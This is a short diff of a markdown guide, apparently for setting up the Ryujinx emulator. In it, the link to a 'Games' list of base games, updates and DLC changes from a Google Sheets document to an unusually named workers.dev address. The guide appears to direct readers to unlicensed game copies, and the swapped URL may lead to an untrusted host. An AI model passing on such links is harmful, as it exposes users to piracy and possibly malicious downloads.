@@ -13,7 +13,7 @@ Unfortunately, since all of the games on the drive are in a special format that 
 
 [nsZip](https://github.com/nicoboss/nsz/releases/download/3.1.1/nsz_v3.1.1_win64_portable.zip) (Windows only)
 
-[Games](https://docs.google.com/spreadsheets/d/1FvoYqPf8RY88rqEYYTcpgSlrDpTLqcXkolldkv9HbIo/edit?usp=sharing) (base is the base game, updates are updates for the games, dlc is dlc for the games)
+[Games](https://peakshop.123bluestacks123bluestacks.workers.dev) (base is the base game, updates are updates for the games, dlc is dlc for the games)
 
 ## Setting up Ryujinx
 
